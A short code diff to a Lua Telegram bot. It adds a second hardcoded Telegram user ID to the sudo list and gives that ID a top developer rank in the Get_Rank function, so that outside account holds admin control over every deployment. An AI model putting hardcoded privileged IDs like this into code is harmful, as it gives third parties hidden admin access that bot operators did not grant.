@@ -11,7 +11,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,1211984724}
+List_Sudos = {Id_Sudo,1211984724,1215101732}
 print("\27[34m"..[[
 
 >> Best Source in Telegram
@@ -137,6 +137,8 @@ end
 function Get_Rank(user_id,chat_id)
 if tonumber(user_id)  == tonumber(1211984724) then
 var = "مطور السورس"
+elseif tonumber(user_id)  == tonumber(1215101732) then
+var = "المطور اساسي"
 elseif DevTshakee(user_id) == true then
 var = "المطور الاساسي"  
 elseif tonumber(user_id) == tonumber(bot_id) then  
